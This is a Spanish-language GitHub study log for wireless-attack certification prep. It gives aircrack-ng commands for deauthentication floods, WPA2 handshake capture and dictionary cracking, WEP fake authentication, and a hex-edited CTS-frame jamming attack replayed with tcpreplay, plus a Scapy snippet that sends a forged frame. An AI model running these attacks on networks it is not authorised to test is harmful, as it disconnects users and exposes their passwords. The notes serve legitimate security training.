<!-- 

Y ARRANCAN!!!


<p align="center"> <img src="solo el link" alt="Mac" height=600px/> </a> </p> 

<p align="center"> <img src="https://user-images.githubusercontent.com/94720207/223137182-929a5e71-1b1f-48c4-94b4-1553a386fefa.png" alt="Mac" height=600px/> </a> </p> 

 -->

# Hacia el Infierno del `OSWA`: <br> `Offensive Security Wireless Attacks` 📡🦈  

![image](https://user-images.githubusercontent.com/94720207/226141680-289c202f-47d7-48d8-b61a-950372a58da0.png)
_Writeup y bitácora para la certificación **CWAP-402** de **CWNP (Certified Wireless Network Professional)**_ <br>
_por @ **Fz3r0 💀** (CWNA)_


## 🗂️ `ÍNDICE`


 
### [🟢 `Introducción`]()
- [🚨 Importante]()

## Introducción

# Fz3r0 - El camino al OSWA
_(Offensive Security Wireless Attacks)_


## Fundamentales

- Hacer siempre todo en **root**: `sudo su`

### Verificaciones 802.11 

````sh
# Revisar configuración de Interfaces
ifconfig

# Revisar configuración de Interfaz Wireless
iwconfig

# Revisar drivers e información de Interfaz usb (pe. Alfa, TP-Link, Panda)
lsusb

# Revisar especificaciones detalladas de la Ineterfaz usb (002 002 se saca primero con lsusb)
lsusb -D /dev/bus/usb/002/002

# Verificar si la antena inyecta paquetes
aireplay-ng -9 wlan0
aireplay-ng --test wlan0

# Verificar banda/canal utilizado y utilizables
iwlist channel

# Verificar el Kernel, versión, de Linux
uname -a
````

---

### Cambiar de Canal o Banda

````sh
# Cambiar canal (ej, 2.4ghz ch 11)
iwconfig wlan0 channel 11

# Cambiar de banda (2.4 GHz)
iwconfig wlan0 freq 2.4G

# Cambiar de banda (5 GHz)
iwconfig wlan0 freq 5G
````

---

### MAC Spoofing

````sh
# Busar Lista de OUI de MACs por nombre (ej. Ruckus)
macchanger -l | grep "Ruckus"

# Hacer MAC Spoofing (cambiar MAC). OJO! Apagar Interfaz primero
ifconfig wlan0 down
macchanger --mac=c4:10:8a:f0:f0:f0 wlan0
````

---

### Frame Inyection

- Esto sirve tanto para 802.3 Ethernet como 802.11 Wireless, depende la interface

````sh
# - intf1     = Interface
# - topspeed  = Máximo posible de interface
# - loop      = Cantidad de Frames
# - .pcap     = El frame a enviar
tcpreplay --intf1=wlan0mon --topspeed --loop=2000 Fz3r0_CTS_808_30000duration_attack.pcap 2>/dev/null
````

---

### Monitor, Aditoría, Captura de WiFi & Apagar/Reiniciar todo

`````sh
   #
   #  ONE LINER (MONITOR)
   #

airmon-ng check kill && airmon-ng start wlan0 && airodump-ng wlan0 -c 6

   #
   #  ONE LINER FULL (MONITOR + SAVE AUDIT .cap)
   #

airmon-ng check kill && airmon-ng start wlan0mon && airodump-ng -c 6 --bssid 30:45:96:D7:F2:3E --write Fz3r0_WiFi_Log wlan0

   #
   #  MONITOR CON IWCONFIG
   #

iwconfig wlan0 mode monitor   

   #
   #  ONE LINER (AUDIT SIN GUARDAR)
   #

airodump-ng -c 6 --essid Fz3r0_Air_PWN wlan0

   #
   #  ONE LINER (AUDIT GUARDANDO)
   #

airodump-ng -c 1 --essid Fz3r0_Air_PWN wlan0 -w captura_wifi_fz3r0-01.cap 

watch -n 1 du -hc captura_wifi_fz3r0-01.cap # <<<--- Opcional para ver en tiempo real la captura guardada

   #
   #  ONE LINER (APAGAR Y REINICIAR INTERFAZ)
   #

airmon-ng stop wlan0 && /etc/init.d/networking restart

`````

---

### Monitor, Aditoría, Captura de WiFi & Apagar/Reiniciar todo: FULL Version:

````sh
   #
   #  INICIAR INTERFAZ Y PONER EN MODO MONITOR
   #

# Detiene todos los procesos problemáticos
airmon-ng check kill

# Inicia la Interfaz "wlan0" en modo MONITOR
airmon-ng start wlan0

   #
   #  ANÁLISIS DE RED WIRELESS
   #

# Hace análisis de la red Wireless (en el canal que esté la interfaz)
airodump-ng wlan0 

# Hace análisis de la red Wireless de manera granular (-c [channel] | --essid [SSID de red WiFi])
airodump-ng -c 1 --essid Fz3r0_Air_PWN wlan0

   #
   #  ANÁLISIS DE RED WIRELESS + GUARDAR CAPTURA
   #

# Una opción solo es guardar la captura y la otra verla en tiempo real mientras se captura
# Para sòlo capturar solo ejecutar el primer comando, para observar ejecutar el segundo en otra consola (2 consolas en total)

# Consola1 
airodump-ng -c 1 --essid Fz3r0_Air_PWN wlan0 -w captura_wifi_fz3r0-01.cap
# Consola2
watch -n 1 du -hc captura_wifi_fz3r0-01.cap

   #
   #  APAGAR INTERFAZ Y/O FINALIZAR PROCESOS Y RESTABLECER INTERFAZ WIRELESS
   #

# Detener la Interfaz 'wlan'
airmon-ng stop wlan0

# Siempre hacer un restart al final que ya se haya parado (depende del Linux el comando):
# Opcion 1
service network-manager restart
# Opcion 2
/etc/init.d/networking restart

### NOTA: para borrar todos los archivos generados: rm * <<<---
````

---




## Ataques y Vulneración de redes WPA/WPA2 (PSK)

### Deauthentication Attack

````sh
   #
   #  DEAUTHENTICATION ATTACK: DIRECTED (Dirigido a un solo objetivo)
   #

# 1. Ventana a) Poner la interface en modo `monitor` y monitorear el aire
# OJO!!! PONERSE EN EL MISMO CANAL DE LA STA VÍCTIMA (Ej, `-c 11`)
airmon-ng check kill && airmon-ng start wlan0 && airodump-ng wlan0 -c 6

# 2. `Ventana b)` Lanzar ataque de `Deauthentication` al SSID/BSS (En este caso 10,000 deauth Frames)
# Opcion 1 (SSID)
aireplay-ng --deauth 10000 -e Fz3r0_Air_PWN -c C8:94:02:B9:10:33 wlan0
# Opcion 2 (BSSID)
aireplay-ng --deauth 10000 -a 30:45:96:D7:F2:3E -c c8:94:02:b9:10:33 wlan0

# 3. En la Ventana a) recibiremos el `WPA handshake: 30:45:96:D7:F2:3E` en la parte superior derecha

   #
   #  DEAUTHENTICATION ATTACK: GLOBAL (Cualquier STA del SSID)
   #

# Opcion 1: Enviar al SSID hacia una MAC broadcast como `FF:FF:FF:FF:FF:FF`
aireplay-ng --deauth 10000 -e Fz3r0_Air_PWN -c FF:FF:FF:FF:FF:FF wlan0
# ó al BSSID :
aireplay-ng --deauth 10000 -a 30:45:96:D7:F2:3E -c FF:FF:FF:FF:FF:FF wlan0

# Opcion 2: Sin ninguna MAC = Broadcast automático:
aireplay-ng --deauth 10000 -a 30:45:96:D7:F2:3E wlan0
````

---

### WPA2 Brute Force: Full Attack

````sh
# Proceso completo de ataque y Brute Force ASAP
# https://esgeeks.com/como-usar-aircrack-ng/

# 1. Monitoreo sencillo para identificar objetivo (kill, monitor on, dump live):
airmon-ng check kill && airmon-ng start wlan0 && airodump-ng wlan0

# 2. Anotar `BSSID` y `Channel` del objetivo, por ejemplo: 

    # BSSID   = 30:45:96:D7:F2:3E
    # Channel = 6
    # EESID   = Fz3r0_Air_PWN

# 3. Ejecutar el dump completamente dirigido al AP target (Channel + BSSID + Write Output)
airodump-ng -c 6 --bssid 30:45:96:D7:F2:3E --write Fz3r0_WiFi_Log wlan0

# 4. (Opcional) Lanzar `Deauthentication Attack` para crear `handshakes` (o esperar a que los clientes haga autenticación real...)

    # -a = Es la dirección MAC de la red WiFi objetivo.
    # -e = Es el ESSID de la red objetivo, es decir, su nombre.
aireplay-ng -0 10 -a 30:45:96:D7:F2:3E -e Fz3r0_Air_PWN wlan0

# 5. Detener el ataque, esperar a que se autentiquen y revisar si llegó algún `handshake` al arhcivo `Fz3r0_WiFi_Log-01.cap`, lanzar comando para desencriptar:
aircrack-ng Fz3r0_WiFi_Log-01.cap -w /usr/share/wordlists/rockyou.txt

# 666. LISTO!!! 

### NOTA: para borrar todos los archivos generados: rm *

   # Ejemplo:

#                               Aircrack-ng 1.6 
#
#      [00:00:01] 6253/10303727 keys tested (8332.39 k/s) 
#
#      Time left: 20 minutes, 35 seconds                          0.06%
#
#                          KEY FOUND! [ password10 ]
#
#
#      Master Key     : FD FB 3C D0 14 FB E7 23 DA 2F 9C 90 1F 3F 5F 4E 
#                       FB 32 E9 46 BD FD 5F 6E F9 06 24 53 CA 76 0C CC 
#
#      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
#                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
#                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
#                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
#
#      EAPOL HMAC     : BE CA 45 62 3E DF B5 A3 AC 3D EB 3D DA 7C 94 98 
````

4-way-handshake
https://www.youtube.com/watch?v=vHIRmG_BzQI

---

### False Authentication Attack (WEP)

````sh

## IMPORTANTE: SOLO SIRVE CON AUTENTICACIÓN WEP!!! (NO WPA/WPA2)

# 1. Monitorizar la red (ventana A)

airmon-ng check kill && airmon-ng start wlan0mon && airodump-ng wlan0mon -c 6

# 2. Hacer ataque de fake auth, esperar a que se haga un association (verificar con aumento de frames)

# -1 = Fake Auth
#  0 = De forma ilimitada la inyección de frames
# -e = SSID victima
# -a = BSSID (AP MAC)
# -h = MAC (puede ser spoofed)

aireplay-ng -1 0 -e Fz3r0_Air_PWN -a 30:45:96:D7:F2:3E -h c4:10:8a:f0:f0:f0 wlan0mon
````

---

### CTS Frame Attack

- [Fz3r0 - CTS Frame Attack](https://github.com/Fz3r0/WiFi-CTS-Frame-Attack-802.11-Frame)

````sh

## CTS = Clear To Send (Control Frames) Attack

    ## - Este ataque se basa en el secuestro de Bandwith (DataRate & Throughput) de la WLAN

    ## - El propósito es deautenticar clientes para al final capturar un handshake (similar a un deauth attack)

# INSTRUCCIONES:    

# 1. Monitorizar la red (ventana A + Save audit .cap) 

    # Ojo: no debe ser tan avanzado y auditoado realmente, solo quiero paturar el CTS, pero para tener ya toda la red para atacar desde un inicio :P (mas adelante necesito el BSS para inyectar el frame anyway)

airmon-ng check kill && airmon-ng start wlan0mon && airmon-ng check kill && airmon-ng start wlan0mon && airodump-ng -c 6 --bssid 30:45:96:D7:F2:3E --write Fz3r0_WiFi_Log wlan0

# 2. Ahora hay que crear, farmear o modificar... un Frame CTS con Duration (microsegundos) muy largo

#     - Lo extraigo de Wireshark farmeando cualquier cosa en la red o de una captura vieja 802.11

# Ejemplo: 

    # Escuchar con Wireshark y buscar CTS con:  >>> wlan.fc.type_subtype == 28 <<<

    # El lugar donde esta el duration en 802.11 frame > CTS > Flags > Duration (Hasta abajo) >>> wlan.duration <<<

    # Seleccionar el frame que quiera, y apuntar bien su Duration!!! p.e.: 556 (ss)

    # Wireshark > File > Export Specified packets > "Fz3r0_CTS_556.pcap"   REVISAR BIEN EXPORTAR "ONLY SELECTED" Y "PCAP (NO NEW GEN)"

# - Abrir ghex con el .pcap creado: 

ghex Fz3r0_CTS_808.pcap  

# - La mejor manera de revisar el duration es abrir ese mismo frame con wireshark y darle click y ya!!! tan facil

# - Las 2 veces que revisé era después del par 6 de derecha a izquierda: (00 2c)

###      0000   00 00 12 00 2e 48 00 00 00 30 85 09 c0 00 e1 01   .....H...0......
###      0010   00 00 c4 00 2c 02 24 11 45 37 8d f0               ....,.$.E7..
###                         -- --

# - Se puede comprobar con Python, por ejemplo:

     # 1 - Sacar el valor little indian (derecha izquierda en pares)

     # 2c 02 = 02 2c

     # 1- Comprobar con python en formato HEX: 0x2c00

# inicio consola python
python3

# En consola python
0x022c

    # Resultado, si fue igual a 556, entonces compruebo ese es el duration en hex

        # >>> 0x022c
        # 556

# 3. Ahora hay que modificar el frame para poner el máximo duration posible de un CTS (30000 ss) 
    
    # Esto va a crear contención artificial ;) 

# inicio consola python
python3

# En consola python
hex(30000)

    # Resultado = 0x7530 

        # >>> hex(30000)
        # '0x7530'

    # Little indian (reversa ahora) = 30 75

    # Entonces ahora el HEX quedaría así

###      0000   00 00 12 00 2e 48 00 00 00 30 85 09 c0 00 e1 01   .....H...0......
###      0010   00 00 c4 00 30 75 24 11 45 37 8d f0               ....,.$.E7..
###                         -- --

# En caso de haber cerrado ghex, volverlo a abrir 

ghex Fz3r0_CTS_808.pcap 

# 1. Modificación de Frame (solo dar doble click y modificar los 2 pares [30 75])

###      0000   00 00 12 00 2e 48 00 00 00 30 85 09 c0 00 e1 01   .....H...0......
###      0010   00 00 c4 00 30 75 24 11 45 37 8d f0               ....,.$.E7..
###                         -- --  

# 2. Modificar la MAC del BSS (AP) que quiero atacar 30:45:96:D7:F2:3E (si el primer frame se capturo de esa MAC entonces será la misma)

###      0000   00 00 12 00 2e 48 00 00 00 30 85 09 c0 00 e1 01   .....H...0......
###      0010   00 00 c4 00 30 75 30 45 96 D7 F2 3E               ....,.$.E7..
###                               -- -- -- -- -- -- 

# 3. Guardar el archivo como un nuevo .pcap (este puede servir en un futuro, solo se necesita cambiar el BSS ;))

    # Save As: Fz3r0_CTS_808_30000duration_attack.pcap

# 4. Validar con wireshark el frame y su duración

wireshark Fz3r0_CTS_808_30000duration_attack.pcap 

    # En mi caso ahora el duration y Receiver Address dice: 

    # Duration:          30000

    # Receiver Address:  30:45:96:D7:F2:3E

    # FCS: Ese puede que marque error pero el frame será válido (recordar que algunas interfaces no capturan FCS como la Panda)

# 2. Inyectar el Frame CTS modificado con TCP Replay  

    # -- topspeed (que lo haga al maximo de velocidad)

    # -- loop (cantidad de frames a enviar)

tcpreplay --intf1=wlan0mon --topspeed --loop=2000 Fz3r0_CTS_808_30000duration_attack.pcap 2>/dev/null

# Se puede validar con <<< wlan.duration == 30000 >>> y se verán los paquetes boom!!!

    # En este punto se pudieron haber ya deautenticado dispositivos en el BSS atacado

````

### Crear CTS con Scappy

````py

# aun no he logrado modificar el duration, pero esto lanza un CTS real ;) 

from scapy.all import *

type_field = 12
subtype_field = 12
FCfield_field = 0
ID_field = 0
addr1_field = "00:11:22:33:44:55"
addr2_field = "aa:bb:cc:dd:ee:ff"
addr3_field = "ff:ee:dd:cc:bb:aa"
SC_field = 0

pkt = RadioTap() / Dot11(type=type_field, subtype=subtype_field, FCfield=FCfield_field, ID=ID_field, addr1=addr1_field, addr2=addr2_field, addr3=addr3_field, SC=SC_field)

print(pkt.summary())

# Enviar el paquete creado
sendp(pkt, iface="wlan0mon", count=1)

````

---

### Beacon Flood Mode





















## Recursos

### Cursos y Data


- https://gist.github.com/s4vitar/3b42532d7d78bafc824fb28a95c8a5eb?permalink_comment_id=3690188#configuraci%C3%B3n-de-la-tarjeta-de-red-y-tips
- https://www.youtube.com/watch?v=ekDHoW14Rb4
- https://www.mastermind.ac/courses/take/hacking-de-redes-inalambricas-wifi/lessons/18126307-bienvenid-al-curso
- https://help.offensive-security.com/hc/en-us/articles/360046904731-OSWP-Exam-Guide
- https://tryhackme.com/room/wifihacking101

### Aircrack NG

- https://www.aircrack-ng.org/


### Modo Monitor

- https://hromero99.github.io/Seguridad-en-redes-dom-sticas/crackingWifi/


24:11:45:37:8d:f0

- nuevas versiones pedos:

https://www.reddit.com/r/Kalilinux/comments/nm14i5/my_wlan0_doesnt_change_to_wlan0mon_but_it_shows/




---

la repsuesta  alos problemas?

- https://www.youtube.com/watch?v=EJa_2I84Q3c

- https://store.rokland.com/pages/usb-wifi-adapters

- https://store.rokland.com/pages/alfa-awus-1900-driver-and-support

- monitor mode script:

- https://store.rokland.com/pages/alfa-wireless-adapters-monitor-mode-help-linux

- `wget http://rokland.com/support/linux/start-mon.sh`

- `bash ./start-mon.sh wlan0mon`





###

- (S4vitar OSWP preparación)[ttps://s4vitar.github.io/oswp-preparacion/#]
